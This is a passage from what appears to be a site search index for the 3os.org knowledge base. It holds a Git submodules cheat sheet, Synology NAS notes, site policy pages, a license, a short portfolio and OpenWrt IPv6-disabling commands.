submodule add https://github.com/fire1ce/3os.org path/to/submodule git add . git commit -m \"adds submodule path/to/submodule\" Cloning A Project With Submodules \u00b6 When you clone a repository that contains submodules there are a few extra steps to be taken. for example: git clone https://github.com/fire1ce/3os.org repo cd repo git submodule init git submodule update If you\u2019re sure you want to fetch all submodules (and their submodules), you can also use this fancy one-liner: git clone --recurse-submodules https://github.com/fire1ce/3os.org Submodule Update \u00b6 If you\u2019re simply tracking the master or main branch for the submodule, you can suffice with a simple fetch and merge . cd path/to/submodule git fetch git merge origin/master If you\u2019re in a hurry, you can streamline this for all submodules in your repo with: git submodule update --remote --recursive Commit this change to your own repo, so others are locked to this new version of the submodule as well. Remove a submodule \u00b6 Delete the relevant section from the .gitmodules file. Stage the .gitmodules changes git add .gitmodules Delete the relevant section from .git/config . Run git rm --cached path_to_submodule (no trailing slash). Run rm -rf .git/modules/path_to_submodule (no trailing slash). Commit git commit -m \"Removed submodule\" Delete the now untracked submodule files rm -rf path_to_submodule", "title": "Submodules Cheat Sheet"}, {"location": "devops/git/git-submodules/#git-submodules-cheat-sheet", "text": "", "title": "Git Submodules Cheat Sheet"}, {"location": "devops/git/git-submodules/#what-is-a-submodule", "text": "Git submodules allow you to keep a git repository as a subdirectory of another git repository. Git submodules are simply a reference to another repository at a particular snapshot in time. Git submodules enable a Git repository to incorporate and track version history of external code.", "title": "What is a Submodule?"}, {"location": "devops/git/git-submodules/#add-a-submodule", "text": "You need to know the remote git repository url and where you want to place that it in your repository. for example: git submodule add https://github.com/fire1ce/3os.org path/to/submodule git add . git commit -m \"adds submodule path/to/submodule\"", "title": "Add a Submodule"}, {"location": "devops/git/git-submodules/#cloning-a-project-with-submodules", "text": "When you clone a repository that contains submodules there are a few extra steps to be taken. for example: git clone https://github.com/fire1ce/3os.org repo cd repo git submodule init git submodule update If you\u2019re sure you want to fetch all submodules (and their submodules), you can also use this fancy one-liner: git clone --recurse-submodules https://github.com/fire1ce/3os.org", "title": "Cloning A Project With Submodules"}, {"location": "devops/git/git-submodules/#submodule-update", "text": "If you\u2019re simply tracking the master or main branch for the submodule, you can suffice with a simple fetch and merge . cd path/to/submodule git fetch git merge origin/master If you\u2019re in a hurry, you can streamline this for all submodules in your repo with: git submodule update --remote --recursive Commit this change to your own repo, so others are locked to this new version of the submodule as well.", "title": "Submodule Update"}, {"location": "devops/git/git-submodules/#remove-a-submodule", "text": "Delete the relevant section from the .gitmodules file. Stage the .gitmodules changes git add .gitmodules Delete the relevant section from .git/config . Run git rm --cached path_to_submodule (no trailing slash). Run rm -rf .git/modules/path_to_submodule (no trailing slash). Commit git commit -m \"Removed submodule\" Delete the now untracked submodule files rm -rf path_to_submodule", "title": "Remove a submodule"}, {"location": "homelab/devices/synology-nas/", "tags": ["HomeLab", "Synology", "NAS"], "text": "Synology DS218+ NAS \u00b6 One of then main devices in my HomeLab is a Synology DS218+ NAS . It purpose mainly for backup and data synchronization tasks. Synology DS218+ NAS was upgraded to 8GB of RAM. It has two SAMSUNG 870 QVO 4TB SSD , running in redundant mode. The 1GbE network was upgraded with SABRENT USB 5GbE Ethernet and the fan was replaced with Noctua NF-A9 FLX Fan for quieter operation. Parts List Synology DS218+ NAS . 2x SAMSUNG 870 QVO 4TB SSD . Noctua NF-A9 FLX Fan . SABRENT USB 5GbE Ethernet . 2x Crucial 4GB DDR3l-1600 . Used for Data backup. Data synchronization. Data storage. Docker containers.", "title": "Synology NAS"}, {"location": "homelab/devices/synology-nas/#synology-ds218-nas", "text": "One of then main devices in my HomeLab is a Synology DS218+ NAS . It purpose mainly for backup and data synchronization tasks. Synology DS218+ NAS was upgraded to 8GB of RAM. It has two SAMSUNG 870 QVO 4TB SSD , running in redundant mode. The 1GbE network was upgraded with SABRENT USB 5GbE Ethernet and the fan was replaced with Noctua NF-A9 FLX Fan for quieter operation. Parts List Synology DS218+ NAS . 2x SAMSUNG 870 QVO 4TB SSD . Noctua NF-A9 FLX Fan . SABRENT USB 5GbE Ethernet . 2x Crucial 4GB DDR3l-1600 . Used for Data backup. Data synchronization. Data storage. Docker containers.", "title": "Synology DS218+ NAS"}, {"location": "information/affiliateDisclosure/", "tags": ["information", "affiliate"], "text": "Affiliate Disclosure \u00b6 This website can include advertising, supported content, paid inserts, affiliate links or other types of monetization. We believe in the authenticity of relationships, views and identities. Compensation received can have an effect on the advertisement material, topics or posts made in this blog. Such content, advertising space or post will be specifically marked as paid or supported content. We will only endorse the products or services that we believe, based on our expertise, are worthy of this endorsement. Any claim, statistic, quotation or other representation of a product or service should be verified with the manufacturer or supplier. This site does not contain any content that may constitute a conflict of interest. This website does not provide any representations, warranties or assurances as to the accuracy, currency or completeness of the content contained on this website or on any website linked to or from this website. Participant Programs\u200b \u00b6 This website is a participant in the Amazon Services LLC Associates Program, aliexpress, an affiliate advertisement program designed to provide a way for websites to receive advertising fees through advertising and links to amazon.com, aliexpress.com.", "title": "Affiliate Disclosure"}, {"location": "information/affiliateDisclosure/#affiliate-disclosure", "text": "This website can include advertising, supported content, paid inserts, affiliate links or other types of monetization. We believe in the authenticity of relationships, views and identities. Compensation received can have an effect on the advertisement material, topics or posts made in this blog. Such content, advertising space or post will be specifically marked as paid or supported content. We will only endorse the products or services that we believe, based on our expertise, are worthy of this endorsement. Any claim, statistic, quotation or other representation of a product or service should be verified with the manufacturer or supplier. This site does not contain any content that may constitute a conflict of interest. This website does not provide any representations, warranties or assurances as to the accuracy, currency or completeness of the content contained on this website or on any website linked to or from this website.", "title": "Affiliate Disclosure"}, {"location": "information/affiliateDisclosure/#participant-programs", "text": "This website is a participant in the Amazon Services LLC Associates Program, aliexpress, an affiliate advertisement program designed to provide a way for websites to receive advertising fees through advertising and links to amazon.com, aliexpress.com.", "title": "Participant Programs\u200b"}, {"location": "information/cookies-policy/", "tags": ["information", "Cookies"], "text": "Cookies Policy \u00b6 We use cookies and other similar technologies to help provide our Services, to advertise to you and to analyse how you use our Services and whether advertisements are being viewed. We also allow third parties to use tracking technologies for similar purposes. If you are using our Services via a browser you can restrict, block or remove cookies through your web browser settings. The Help menu on the menu bar of most browsers also tells you how to prevent your browser from accepting new cookies, how to delete old cookies, how to have the browser notify you when you receive a new cookie and how to disable cookies altogether. What are Cookies? \u00b6 A cookie is a small text file which is sent to your computer or mobile device (referred to in this policy as a \u201cdevice\u201d) by the web server so that the website can remember some information about your browsing activity on the website. The cookie will collect information relating to your use of our sites, information about your device such as the device\u2019s IP address and browser type, demographic data and, if you arrived at our site via a link from third party site, the URL of the linking page. If you are a registered user or subscriber it may also collect your name and email address, which may be transferred to data processors for registered user or subscriber verification purposes. Cookies record information about your online preferences and help us to tailor our websites to your interests. Information provided by cookies can help us to analyse your use of our sites and help us to provide you with a better user experience. We use tracking technologies for the following purposes: Performance Purposes \u00b6 These cookies are necessary for the website to function and cannot be switched off in our systems. These are used to let you login, to ensure site security and to provide shopping cart functionality. Without this type of technology, our Services won\u2019t work properly or won\u2019t be able to provide certain features and functionalities. Personalization Cookies \u00b6 These cookies are used to analyze how visitors use a website, for instance which pages visitors visit most often, in order to provide a better user experience. We also use this technology to check if you have opened our emails, so we can see if they are being delivered correctly and are of interest. Advertising Cookies \u00b6 These cookies are used to limit the number of times you see an advertisement, or to customize advertising across our Services and make it more relevant to you and to allow us to measure the effectiveness of advertising campaigns and track whether ads have been properly displayed so we can pay for this. You have the option to change your choices relating to cookies utilized to deliver behaviorally targeted advertising here for EU \u201cAdvertising cookies\u201d and here for US Advertising cookies. Social Media Cookies \u00b6 Cookies are used by social media services to enable you to share our content with your friends and networks. These cookies may track your browser across other sites and build a profile of your interests, which may impact the content and messages you see on other websites that you visit. Google Analytics \u00b6 We use Google Analytics for aggregated, anonymized website traffic analysis. In order to track your session usage, Google drops a cookie (_ga) with a randomly-generated ClientID in your browser. This ID is anonymized and contains no identifiable information like email, phone number, name, etc. We also send Google your IP Address. We use GA to track aggregated website behavior, such as what pages you looked at, for how long, and so on. This information is important to us for improving the user experience and determining site effectiveness. If you would like to access what browsing information we have \u2013 or ask us to delete any GA data \u2013 please delete your _ga cookies, reach out to us via this form, and/or install the Google Analytics Opt-Out Browser Add-On. How to manage & remove cookies \u00b6 If you are using our Services via a browser you can restrict, block or remove cookies through your web browser settings. The Help menu on the menu bar of most browsers also tells you how to prevent your browser from accepting new cookies, how to delete old cookies, how to have the browser notify you when you receive a new cookie and how to disable cookies altogether. You can also visit https://www.aboutcookies.org for more information on how to manage and remove cookies across a number of different internet browsers. You also have the option to change your choices relating to cookies utilized to deliver behaviorally targeted advertising here for EU \u201cAdvertising cookies\u201d and here for US Advertising cookies. If you would like to contact us about cookies please our online feedback form or our contact page.", "title": "Cookies Policy"}, {"location": "information/cookies-policy/#cookies-policy", "text": "We use cookies and other similar technologies to help provide our Services, to advertise to you and to analyse how you use our Services and whether advertisements are being viewed. We also allow third parties to use tracking technologies for similar purposes. If you are using our Services via a browser you can restrict, block or remove cookies through your web browser settings. The Help menu on the menu bar of most browsers also tells you how to prevent your browser from accepting new cookies, how to delete old cookies, how to have the browser notify you when you receive a new cookie and how to disable cookies altogether.", "title": "Cookies Policy"}, {"location": "information/cookies-policy/#what-are-cookies", "text": "A cookie is a small text file which is sent to your computer or mobile device (referred to in this policy as a \u201cdevice\u201d) by the web server so that the website can remember some information about your browsing activity on the website. The cookie will collect information relating to your use of our sites, information about your device such as the device\u2019s IP address and browser type, demographic data and, if you arrived at our site via a link from third party site, the URL of the linking page. If you are a registered user or subscriber it may also collect your name and email address, which may be transferred to data processors for registered user or subscriber verification purposes. Cookies record information about your online preferences and help us to tailor our websites to your interests. Information provided by cookies can help us to analyse your use of our sites and help us to provide you with a better user experience. We use tracking technologies for the following purposes:", "title": "What are Cookies?"}, {"location": "information/cookies-policy/#performance-purposes", "text": "These cookies are necessary for the website to function and cannot be switched off in our systems. These are used to let you login, to ensure site security and to provide shopping cart functionality. Without this type of technology, our Services won\u2019t work properly or won\u2019t be able to provide certain features and functionalities.", "title": "Performance Purposes"}, {"location": "information/cookies-policy/#personalization-cookies", "text": "These cookies are used to analyze how visitors use a website, for instance which pages visitors visit most often, in order to provide a better user experience. We also use this technology to check if you have opened our emails, so we can see if they are being delivered correctly and are of interest.", "title": "Personalization Cookies"}, {"location": "information/cookies-policy/#advertising-cookies", "text": "These cookies are used to limit the number of times you see an advertisement, or to customize advertising across our Services and make it more relevant to you and to allow us to measure the effectiveness of advertising campaigns and track whether ads have been properly displayed so we can pay for this. You have the option to change your choices relating to cookies utilized to deliver behaviorally targeted advertising here for EU \u201cAdvertising cookies\u201d and here for US Advertising cookies.", "title": "Advertising Cookies"}, {"location": "information/cookies-policy/#social-media-cookies", "text": "Cookies are used by social media services to enable you to share our content with your friends and networks. These cookies may track your browser across other sites and build a profile of your interests, which may impact the content and messages you see on other websites that you visit.", "title": "Social Media Cookies"}, {"location": "information/cookies-policy/#google-analytics", "text": "We use Google Analytics for aggregated, anonymized website traffic analysis. In order to track your session usage, Google drops a cookie (_ga) with a randomly-generated ClientID in your browser. This ID is anonymized and contains no identifiable information like email, phone number, name, etc. We also send Google your IP Address. We use GA to track aggregated website behavior, such as what pages you looked at, for how long, and so on. This information is important to us for improving the user experience and determining site effectiveness. If you would like to access what browsing information we have \u2013 or ask us to delete any GA data \u2013 please delete your _ga cookies, reach out to us via this form, and/or install the Google Analytics Opt-Out Browser Add-On.", "title": "Google Analytics"}, {"location": "information/cookies-policy/#how-to-manage-remove-cookies", "text": "If you are using our Services via a browser you can restrict, block or remove cookies through your web browser settings. The Help menu on the menu bar of most browsers also tells you how to prevent your browser from accepting new cookies, how to delete old cookies, how to have the browser notify you when you receive a new cookie and how to disable cookies altogether. You can also visit https://www.aboutcookies.org for more information on how to manage and remove cookies across a number of different internet browsers. You also have the option to change your choices relating to cookies utilized to deliver behaviorally targeted advertising here for EU \u201cAdvertising cookies\u201d and here for US Advertising cookies. If you would like to contact us about cookies please our online feedback form or our contact page.", "title": "How to manage &amp; remove cookies"}, {"location": "information/endorsement/", "tags": ["information", "endorsements"], "text": "Website Endorsements \u00b6 Website endorsement for our partners and friends who support our mission. adventure.app \u00b6 Adventure is an app that provides you with a simple and intuitive interface to plan your trip. You can choose from a wide range of activities and destinations. We also provide you with a recommendation system that will help you choose the best activity for you. Visit adventure.app!", "title": "Website Endorsements"}, {"location": "information/endorsement/#website-endorsements", "text": "Website endorsement for our partners and friends who support our mission.", "title": "Website Endorsements"}, {"location": "information/endorsement/#adventureapp", "text": "Adventure is an app that provides you with a simple and intuitive interface to plan your trip. You can choose from a wide range of activities and destinations. We also provide you with a recommendation system that will help you choose the best activity for you. Visit adventure.app!", "title": "adventure.app"}, {"location": "information/license/", "tags": ["information", "license"], "text": "License \u00b6 MIT License \u00b6 Copyright\u00a9 3os.org 2022 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.", "title": "MIT License"}, {"location": "information/license/#license", "text": "", "title": "License"}, {"location": "information/license/#mit-license", "text": "Copyright\u00a9 3os.org 2022 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.", "title": "MIT License"}, {"location": "information/portfolio/", "tags": ["portfolio", "resume"], "text": "Stas Yakobov's Portfolio \u00b6 .md-typeset img { display: inline; Stas Yakobov aka fire1ce \u2022 I'm information security consultant - specialized in web application and penteration testing \u2022 I like experimenting with technologies, building small projects, automate everything. \u2022 Passionate about security, linux, dockers, electronics(IoT), coding, open-source and knowledge \u2022 I'm the owner and the maintener of a 3os.org knowledge-base website How To Reach Me", "title": "Stas Yakobov's Portfolio"}, {"location": "information/portfolio/#stas-yakobovs-portfolio", "text": ".md-typeset img { display: inline;", "title": "Stas Yakobov's Portfolio"}, {"location": "information/privacy-policy/", "tags": ["information", "privacy policy"], "text": "Privacy Policy \u00b6 Your privacy is very important to us. Accordingly, we have developed this policy in order for you to understand how we collect, use, communicate and make use of personal information. The following outlines our privacy policy. When accessing this website, will learn certain information about you during your visit. Similar to other commercial websites, our website utilizes a standard technology called \u2018cookies\u2019 (see explanation below) and server logs to collect information about how our site is used. Information gathered through cookies and server logs may include the date and time of visits, the pages viewed, time spent at our site, and the websites visited just before and just after our own, as well as your IP address. Use of Cookie \u00b6 A cookie is a very small text document, which often includes an anonymous unique identifier. When you visit a website, that site\u2019s computer asks your computer for permission to store this file in a part of your hard drive specifically designated for cookies. Each website can send its own cookie to your browser if your browser\u2019s preferences allow it, but (to protect your privacy) your browser only permits a website to access the cookies it has already sent to you, not the cookies sent to you by other sites. IP Addresses \u00b6 IP addresses are used by your computer every time you are connected to the Internet. Your IP address is a number that is used by computers on the network to identify your computer. IP addresses are automatically collected by our web server as part of demographic and profile data known as \u201ctraffic data\u201d so that data (such as the Web pages you request) can be sent to you. Email Information \u00b6 If you choose to correspond with us through email, we may retain the content of your email messages together with your email address and our responses. We provide the same protections for these electronic communications that we employ in the maintenance of information received online, mail and telephone. This also applies when you register for our website, sign up through any of our forms using your email address or make a purchase on this site. For further information see the email policies below. How Do We Use The Information That You Provide To Us? \u00b6 Broadly speaking, we use personal information for purposes of administering our business activities, providing customer service and making available other items and services to our customers and prospective customers. will not obtain personally-identifying information about you when you visit our site, unless you choose to provide such information to us, nor will such information be sold or otherwise transferred to unaffiliated third parties without the approval of the user at the time of collection. We may disclose information when legally compelled to do so, in other words, when we, in good faith, believe that the law requires it or for the protection of our legal rights. Email Policies \u00b6 We are committed to keeping your e-mail address confidential. We do not sell, rent, or lease our subscription lists to third parties, and we will not provide your personal information to any third party individual, government agency, or company at any time unless strictly compelled to do so by law. We will use your e-mail address solely to provide timely information about . We will maintain the information you send via e-mail in accordance with applicable federal law. CAN-SPAM Compliance \u00b6 In compliance with the CAN-SPAM Act, all e-mail sent from our organization will clearly state who the e-mail is from and provide clear information on how to contact the sender. In addition, all e-mail messages will also contain concise information on how to remove yourself from our mailing list so that you receive no further e-mail communication from us. Choice/Opt-Out \u00b6 Our site provides users the opportunity to opt-out of receiving communications from us and our partners by reading the unsubscribe instructions located at the bottom of any e-mail they receive from us at anytime. Users who no longer wish to receive our newsletter or promotional materials may opt-out of receiving these communications by clicking on the unsubscribe link in the e-mail. Use of External Links \u00b6 This website may contain links to many other websites. cannot guarantee the accuracy of information found at any linked site. Links to or from external sites not owned or controlled by do not constitute an endorsement by or any of its employees of the sponsors of these sites or the products or information presented therein. By accessing this web site, you are agreeing to be bound by these web site Terms and Conditions of Use, all applicable laws and regulations, and agree that you are responsible for compliance with any applicable local laws. If you do not agree with any of these terms, you are prohibited from using or accessing this site. The materials contained in this web site are protected by applicable copyright and trade mark law. Acceptable Use \u00b6 You agree to use our website only for lawful purposes, and in a way that does not infringe the rights of, restrict or inhibit anyone else\u2019s use and enjoyment of the website. Prohibited behavior includes harassing or causing distress or inconvenience to any other user, transmitting obscene or offensive content or disrupting the normal flow of dialogue within our website. You must not use our website to send unsolicited commercial communications. You must not use the content on our website for any marketing related purpose without our express written consent. Restricted Access \u00b6 We may in the future need to restrict access to parts (or all) of our website and reserve full rights to do so. If, at any point, we provide you with a username and password for you to access restricted areas of our website, you must ensure that both your username and password are kept confidential. Use of Testimonials \u00b6 In accordance to with the FTC guidelines concerning the use of endorsements and testimonials in advertising, please be aware of the following: Testimonials that appear on this site are actually received via text, audio or video submission. They are individual experiences, reflecting real life experiences of those who have used our products and/or services in some way. They are individual results and results do vary. We do not claim that they are typical results. The testimonials are not necessarily representative of all of those who will use our products and/or services. The testimonials displayed in any form on this site (text, audio, video or other) are reproduced verbatim, except for correction of grammatical or typing errors. Some may have been shortened. In other words, not the whole message received by the testimonial writer is displayed when it seems too lengthy or not the whole statement seems relevant for the general public. We are not responsible for any of the opinions or comments posted on this website. This website is not a forum for testimonials, however provides testimonials as a means for customers to share their experiences with one another. To protect against abuse, all testimonials appear after they have been reviewed by the management . We not share the opinions, views or commentary of any testimonials on this website \u2013 the opinions are strictly the views of the testimonial source. The testimonials are never intended to make claims that our products and/or services can be used to diagnose, treat, cure, mitigate or prevent any disease. Any such claims, implicit or explicit, in any shape or form, have not been clinically tested or evaluated. How Do We Protect Your Information And Secure Information Transmissions? Email is not recognized as a secure medium of communication. For this reason, we request that you do not send private information to us by email. However, doing so is allowed, but at your own risk. Some of the information you may enter on our website may be transmitted securely via a secure medium known as Secure Sockets Layer, or SSL. Credit Card information and other sensitive information is never transmitted via email. We may use software programs to create summary statistics, which are used for such purposes as assessing the number of visitors to the different sections of our site, what information is of most and least interest, determining technical design specifications, and identifying system performance or problem areas. For site security purposes and to ensure that this service remains available to all users, uses software programs to monitor network traffic to identify unauthorized attempts to upload or change information, or otherwise cause damage. Disclaimer And Limitation Of Liability \u00b6 We makes no representations, warranties, or assurances as to the accuracy, currency or completeness of the content contain on this website or any sites linked to this site. All the materials on this site are provided \u2018as is\u2019 without any express or implied warranty of any kind, including warranties of merchantability, noninfringement of intellectual property or fitness for any particular purpose. In no event shall or its agents or associates be liable for any damages whatsoever (including, without limitation, damages for loss of profits, business interruption, loss of information, injury or death) arising out of the use of or inability to use the materials, even if has been advised of the possibility of such loss or damages. Policy Changes \u00b6 We reserve the right to amend this privacy policy at any time with or without notice. However, please be assured that if the privacy policy changes in the future, we will not use the personal information you have submitted to us under this privacy policy in a manner that is materially inconsistent with this privacy policy, without your prior consent. We are committed to conducting our business in accordance with these principles in order to ensure that the confidentiality of personal information is protected and maintained.", "title": "Privacy Policy"}, {"location": "information/privacy-policy/#privacy-policy", "text": "Your privacy is very important to us. Accordingly, we have developed this policy in order for you to understand how we collect, use, communicate and make use of personal information. The following outlines our privacy policy. When accessing this website, will learn certain information about you during your visit. Similar to other commercial websites, our website utilizes a standard technology called \u2018cookies\u2019 (see explanation below) and server logs to collect information about how our site is used. Information gathered through cookies and server logs may include the date and time of visits, the pages viewed, time spent at our site, and the websites visited just before and just after our own, as well as your IP address.", "title": "Privacy Policy"}, {"location": "information/privacy-policy/#use-of-cookie", "text": "A cookie is a very small text document, which often includes an anonymous unique identifier. When you visit a website, that site\u2019s computer asks your computer for permission to store this file in a part of your hard drive specifically designated for cookies. Each website can send its own cookie to your browser if your browser\u2019s preferences allow it, but (to protect your privacy) your browser only permits a website to access the cookies it has already sent to you, not the cookies sent to you by other sites.", "title": "Use of Cookie"}, {"location": "information/privacy-policy/#ip-addresses", "text": "IP addresses are used by your computer every time you are connected to the Internet. Your IP address is a number that is used by computers on the network to identify your computer. IP addresses are automatically collected by our web server as part of demographic and profile data known as \u201ctraffic data\u201d so that data (such as the Web pages you request) can be sent to you.", "title": "IP Addresses"}, {"location": "information/privacy-policy/#email-information", "text": "If you choose to correspond with us through email, we may retain the content of your email messages together with your email address and our responses. We provide the same protections for these electronic communications that we employ in the maintenance of information received online, mail and telephone. This also applies when you register for our website, sign up through any of our forms using your email address or make a purchase on this site. For further information see the email policies below.", "title": "Email Information"}, {"location": "information/privacy-policy/#how-do-we-use-the-information-that-you-provide-to-us", "text": "Broadly speaking, we use personal information for purposes of administering our business activities, providing customer service and making available other items and services to our customers and prospective customers. will not obtain personally-identifying information about you when you visit our site, unless you choose to provide such information to us, nor will such information be sold or otherwise transferred to unaffiliated third parties without the approval of the user at the time of collection. We may disclose information when legally compelled to do so, in other words, when we, in good faith, believe that the law requires it or for the protection of our legal rights.", "title": "How Do We Use The Information That You Provide To Us?"}, {"location": "information/privacy-policy/#email-policies", "text": "We are committed to keeping your e-mail address confidential. We do not sell, rent, or lease our subscription lists to third parties, and we will not provide your personal information to any third party individual, government agency, or company at any time unless strictly compelled to do so by law. We will use your e-mail address solely to provide timely information about . We will maintain the information you send via e-mail in accordance with applicable federal law.", "title": "Email Policies"}, {"location": "information/privacy-policy/#can-spam-compliance", "text": "In compliance with the CAN-SPAM Act, all e-mail sent from our organization will clearly state who the e-mail is from and provide clear information on how to contact the sender. In addition, all e-mail messages will also contain concise information on how to remove yourself from our mailing list so that you receive no further e-mail communication from us.", "title": "CAN-SPAM Compliance"}, {"location": "information/privacy-policy/#choiceopt-out", "text": "Our site provides users the opportunity to opt-out of receiving communications from us and our partners by reading the unsubscribe instructions located at the bottom of any e-mail they receive from us at anytime. Users who no longer wish to receive our newsletter or promotional materials may opt-out of receiving these communications by clicking on the unsubscribe link in the e-mail.", "title": "Choice/Opt-Out"}, {"location": "information/privacy-policy/#use-of-external-links", "text": "This website may contain links to many other websites. cannot guarantee the accuracy of information found at any linked site. Links to or from external sites not owned or controlled by do not constitute an endorsement by or any of its employees of the sponsors of these sites or the products or information presented therein. By accessing this web site, you are agreeing to be bound by these web site Terms and Conditions of Use, all applicable laws and regulations, and agree that you are responsible for compliance with any applicable local laws. If you do not agree with any of these terms, you are prohibited from using or accessing this site. The materials contained in this web site are protected by applicable copyright and trade mark law.", "title": "Use of External Links"}, {"location": "information/privacy-policy/#acceptable-use", "text": "You agree to use our website only for lawful purposes, and in a way that does not infringe the rights of, restrict or inhibit anyone else\u2019s use and enjoyment of the website. Prohibited behavior includes harassing or causing distress or inconvenience to any other user, transmitting obscene or offensive content or disrupting the normal flow of dialogue within our website. You must not use our website to send unsolicited commercial communications. You must not use the content on our website for any marketing related purpose without our express written consent.", "title": "Acceptable Use"}, {"location": "information/privacy-policy/#restricted-access", "text": "We may in the future need to restrict access to parts (or all) of our website and reserve full rights to do so. If, at any point, we provide you with a username and password for you to access restricted areas of our website, you must ensure that both your username and password are kept confidential.", "title": "Restricted Access"}, {"location": "information/privacy-policy/#use-of-testimonials", "text": "In accordance to with the FTC guidelines concerning the use of endorsements and testimonials in advertising, please be aware of the following: Testimonials that appear on this site are actually received via text, audio or video submission. They are individual experiences, reflecting real life experiences of those who have used our products and/or services in some way. They are individual results and results do vary. We do not claim that they are typical results. The testimonials are not necessarily representative of all of those who will use our products and/or services. The testimonials displayed in any form on this site (text, audio, video or other) are reproduced verbatim, except for correction of grammatical or typing errors. Some may have been shortened. In other words, not the whole message received by the testimonial writer is displayed when it seems too lengthy or not the whole statement seems relevant for the general public. We are not responsible for any of the opinions or comments posted on this website. This website is not a forum for testimonials, however provides testimonials as a means for customers to share their experiences with one another. To protect against abuse, all testimonials appear after they have been reviewed by the management . We not share the opinions, views or commentary of any testimonials on this website \u2013 the opinions are strictly the views of the testimonial source. The testimonials are never intended to make claims that our products and/or services can be used to diagnose, treat, cure, mitigate or prevent any disease. Any such claims, implicit or explicit, in any shape or form, have not been clinically tested or evaluated. How Do We Protect Your Information And Secure Information Transmissions? Email is not recognized as a secure medium of communication. For this reason, we request that you do not send private information to us by email. However, doing so is allowed, but at your own risk. Some of the information you may enter on our website may be transmitted securely via a secure medium known as Secure Sockets Layer, or SSL. Credit Card information and other sensitive information is never transmitted via email. We may use software programs to create summary statistics, which are used for such purposes as assessing the number of visitors to the different sections of our site, what information is of most and least interest, determining technical design specifications, and identifying system performance or problem areas. For site security purposes and to ensure that this service remains available to all users, uses software programs to monitor network traffic to identify unauthorized attempts to upload or change information, or otherwise cause damage.", "title": "Use of Testimonials"}, {"location": "information/privacy-policy/#disclaimer-and-limitation-of-liability", "text": "We makes no representations, warranties, or assurances as to the accuracy, currency or completeness of the content contain on this website or any sites linked to this site. All the materials on this site are provided \u2018as is\u2019 without any express or implied warranty of any kind, including warranties of merchantability, noninfringement of intellectual property or fitness for any particular purpose. In no event shall or its agents or associates be liable for any damages whatsoever (including, without limitation, damages for loss of profits, business interruption, loss of information, injury or death) arising out of the use of or inability to use the materials, even if has been advised of the possibility of such loss or damages.", "title": "Disclaimer And Limitation Of Liability"}, {"location": "information/privacy-policy/#policy-changes", "text": "We reserve the right to amend this privacy policy at any time with or without notice. However, please be assured that if the privacy policy changes in the future, we will not use the personal information you have submitted to us under this privacy policy in a manner that is materially inconsistent with this privacy policy, without your prior consent. We are committed to conducting our business in accordance with these principles in order to ensure that the confidentiality of personal information is protected and maintained.", "title": "Policy Changes"}, {"location": "infrastructure/openwrt/disable-ipv6/", "tags": ["template", "markdown"], "text": "OpenWrt Disable IPV6 \u00b6 The following steps will disable IPV6 on your OpenWrt router . All the steps are performed via the command line. You can performe them in the console of the router but the preferred way is via SSH. Follow the following steps to disable IPV6 on your OpenWrt router: uci set 'network.lan.ipv6=0' uci set 'network.wan.ipv6=0' uci set 'dhcp.lan.dhcpv6=disabled' /etc/init.d/odhcpd disable uci commit Disable RA and DHCPv6 so no IPv6 IPs are handed out: uci -q delete dhcp.lan.dhcpv6 uci -q delete dhcp.lan.ra uci commit dhcp /etc/init.d/odhcpd restart You can now disable the LAN delegation: uci set network.lan.delegate = \"0\" uci commit network /etc/init.d/network restart You might as well disable odhcpd: /etc/init.d/odhcpd disable /etc/init.d/odhcpd stop And finally you can delete the IPv6 ULA Prefix: uci -q delete network.globals.ula_prefix uci commit network /etc/init.d/network restart", "title": "Disable IPV6"}, {"location": "infrastructure/openwrt/disable-ipv6/#openwrt-disable-ipv6", "text": "The following steps will disable IPV6 on your OpenWrt router . All the steps are performed via the command line. You can performe them in the console of the router but the preferred way is via SSH. Follow the following steps to disable IPV6 on your OpenWrt router: uci set 'network.lan.ipv6=0' uci set 'network.wan.ipv6=0' uci set 'dhcp.lan.dhcpv6=disabled' /etc/init.d/odhcpd disable uci commit Disable RA and DHCPv6 so no IPv6 IPs are handed out: uci -q delete dhcp.lan.dhcpv6 uci -q delete dhcp.lan.ra uci commit dhcp /etc/init.d/odhcpd restart You can now disable the LAN delegation: uci set network.lan.delegate = \"0\" uci commit network /etc/init.d/network restart You might as well disable odhcpd: /etc/init.d/odhcpd disable /etc/init.d/odhcpd stop And finally you can delete the IPv6 ULA Prefix: uci -q delete network.globals.ula_prefix uci commit network /etc/init.d/network restart", "title": "OpenWrt Disable IPV6"}, {"location": "infrastructure/openwrt/install-oh-my-zsh/", "tags": ["template", "markdown"], "text": "Install oh-my-zsh on OpenWrt \u00b6 You can install oh-my-zsh on OpenWrt, make sure to use the Prevent User Lockout option since many users been locked out of their sessions since the zsh shell was not installed or loaded properly. Whats' ZSH \u00b6 Z-shell (Zsh) configuration. is a Unix shell that can be used as an interactive login shell and as a shell 